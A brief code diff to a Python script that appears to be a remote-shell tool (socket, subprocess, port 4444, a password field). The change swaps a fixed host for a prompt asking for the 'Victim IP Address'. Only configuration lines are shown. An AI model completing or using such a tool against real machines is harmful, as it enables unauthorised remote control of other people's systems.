@@ -1,7 +1,8 @@
 import socket
 import subprocess
 
-REMOTE_HOST = '10.0.2.5'
+HOST_IP = input('Enter Victim IP Address: ')
+REMOTE_HOST = HOST_IP
 REMOTE_PORT = 4444
 PASSWORD = ""
 escape = False
